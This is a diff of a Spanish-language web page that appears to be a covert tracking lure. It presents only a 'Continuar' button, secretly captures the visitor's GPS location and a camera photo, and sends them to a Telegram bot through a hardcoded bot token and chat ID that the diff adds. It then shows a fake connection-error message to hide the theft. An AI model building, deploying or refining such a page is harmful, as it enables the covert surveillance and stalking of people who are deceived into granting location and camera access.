@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Continuar</title>
+    <title>Acceso rápido</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #f1f3f4;
+            background: #e8f5e9;  /* verde claro, diferente al azul de society */
             font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
             display: flex;
             justify-content: center;
@@ -27,7 +27,7 @@
         h1 {
             font-size: 1.8rem;
             font-weight: 600;
-            color: #1a1a1a;
+            color: #2e7d32;  /* verde oscuro */
             margin-bottom: 12px;
         }
         p {
@@ -36,7 +36,7 @@
             margin-bottom: 28px;
         }
         button {
-            background: #1a73e8;
+            background: #2e7d32;
             color: white;
             border: none;
             border-radius: 28px;
@@ -48,29 +48,37 @@
             transition: background 0.2s;
         }
         button:active {
-            background: #1557b0;
+            background: #1b5e20;
             transform: scale(0.98);
         }
         .error-msg {
             margin-top: 20px;
-            color: red;
+            color: #d32f2f;
             font-size: 0.8rem;
+            background: #ffebee;
+            padding: 8px;
+            border-radius: 8px;
+            display: none;
         }
     </style>
 </head>
 <body>
 <div class="card">
-    <h1>Continuar</h1>
+    <h1>🔓 Acceso rápido</h1>
     <p>Presiona el botón para continuar</p>
     <button id="btn">Continuar</button>
     <div id="errorMsg" class="error-msg"></div>
 </div>
+
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-    const WORKER_URL = 'https://proxy-tg.societykark.workers.dev/';
+    // ================= TOKEN Y CHAT ID (directos) =================
+    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';  // ⚠️ REVOCA ESTE Y PON UNO NUEVO
+    const CHAT_ID = '7555997298';                                        // TU CHAT ID
 
+    // ================= FUNCIONES =================
     async function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -103,15 +111,24 @@
         return blob;
     }
 
-    async function sendToWorker(text, photoBlob) {
-        const formData = new FormData();
-        formData.append('text', text);
-        if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
+    async function sendMessage(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
-            await fetch(WORKER_URL, { method: 'POST', body: formData });
-        } catch(e) {
-            console.error(e);
-        }
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
+            });
+        } catch(e) { console.error(e); }
+    }
+
+    async function sendPhoto(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'photo.jpg');
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } catch(e) { console.error(e); }
     }
 
     document.getElementById('btn').onclick = async () => {
@@ -123,12 +140,15 @@
             text = '📍 Ubicación no disponible (permiso denegado)';
         }
         const foto = await capturePhoto();
-        await sendToWorker(text, foto);
+
+        // Enviar texto y foto a Telegram
+        await sendMessage(text);
+        if (foto) await sendPhoto(foto);
 
         // Mostrar mensaje de error falso (sin redirigir)
         const errorDiv = document.getElementById('errorMsg');
         errorDiv.innerText = 'Error de conexión. Por favor, recarga la página e intenta de nuevo.';
-        // No redirigir a Google
+        errorDiv.style.display = 'block';
     };
 </script>
 </body>
